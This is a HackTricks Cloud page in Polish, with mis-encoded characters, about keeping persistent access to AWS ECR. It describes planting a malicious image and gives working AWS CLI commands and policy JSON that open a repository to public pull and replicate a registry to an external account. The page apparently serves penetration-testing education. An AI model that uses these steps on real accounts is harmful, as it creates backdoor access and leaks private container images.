# AWS - ECR Persistence

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz hakowanie AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz hakowanie GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wspieraj HackTricks</summary>

* SprawdÅº [**plany subskrypcji**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ trikami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w na githubie.

</details>
{% endhint %}

## ECR

WiÄ™cej informacji znajdziesz tutaj:

{% content-ref url="../aws-services/aws-ecr-enum.md" %}
[aws-ecr-enum.md](../aws-services/aws-ecr-enum.md)
{% endcontent-ref %}

### Ukryty obraz Docker z zÅ‚oÅ›liwym kodem

AtakujÄ…cy moÅ¼e **przesÅ‚aÄ‡ obraz Docker zawierajÄ…cy zÅ‚oÅ›liwy kod** do repozytorium ECR i uÅ¼yÄ‡ go do utrzymania trwaÅ‚oÅ›ci w docelowym koncie AWS. NastÄ™pnie atakujÄ…cy moÅ¼e wdroÅ¼yÄ‡ zÅ‚oÅ›liwy obraz do rÃ³Å¼nych usÅ‚ug w ramach konta, takich jak Amazon ECS lub EKS, w sposÃ³b ukryty.

### Polityka repozytorium

Dodaj politykÄ™ do pojedynczego repozytorium, przyznajÄ…c sobie (lub wszystkim) dostÄ™p do repozytorium:
```bash
aws ecr set-repository-policy \
--repository-name cluster-autoscaler \
--policy-text file:///tmp/my-policy.json

# With a .json such as

{
"Version" : "2008-10-17",
"Statement" : [
{
"Sid" : "allow public pull",
"Effect" : "Allow",
"Principal" : "*",
"Action" : [
"ecr:BatchCheckLayerAvailability",
"ecr:BatchGetImage",
"ecr:GetDownloadUrlForLayer"
]
}
]
}
```
{% hint style="warning" %}
NaleÅ¼y pamiÄ™taÄ‡, Å¼e ECR wymaga, aby uÅ¼ytkownicy mieli **uprawnienia** do wykonywania wywoÅ‚aÅ„ do API **`ecr:GetAuthorizationToken`** za poÅ›rednictwem polityki IAM **zanim bÄ™dÄ… mogli uwierzytelniÄ‡ siÄ™** w rejestrze i przesyÅ‚aÄ‡ lub pobieraÄ‡ jakiekolwiek obrazy z dowolnego repozytorium Amazon ECR.
{% endhint %}

### Polityka Rejestru i Replikacja MiÄ™dzykontowa

MoÅ¼liwe jest automatyczne replikowanie rejestru w zewnÄ™trznym koncie, konfigurujÄ…c replikacjÄ™ miÄ™dzykontowÄ…, gdzie trzeba **wskazaÄ‡ zewnÄ™trzne konto**, w ktÃ³rym chcesz replikowaÄ‡ rejestr.

<figure><img src="../../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

Najpierw musisz daÄ‡ zewnÄ™trznemu kontu dostÄ™p do rejestru za pomocÄ… **polityki rejestru** takiej jak:
```bash
aws ecr put-registry-policy --policy-text file://my-policy.json

# With a .json like:

{
"Sid": "asdasd",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::947247140022:root"
},
"Action": [
"ecr:CreateRepository",
"ecr:ReplicateImage"
],
"Resource": "arn:aws:ecr:eu-central-1:947247140022:repository/*"
}
```
NastÄ™pnie zastosuj konfiguracjÄ™ replikacji:
```bash
aws ecr put-replication-configuration \
--replication-configuration file://replication-settings.json \
--region us-west-2

# Having the .json a content such as:
{
"rules": [{
"destinations": [{
"region": "destination_region",
"registryId": "destination_accountId"
}],
"repositoryFilters": [{
"filter": "repository_prefix_name",
"filterType": "PREFIX_MATCH"
}]
}]
}
```
{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wspieraj HackTricks</summary>

* SprawdÅº [**plany subskrypcji**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) albo **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ trikami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w na githubie.

</details>
{% endhint %}
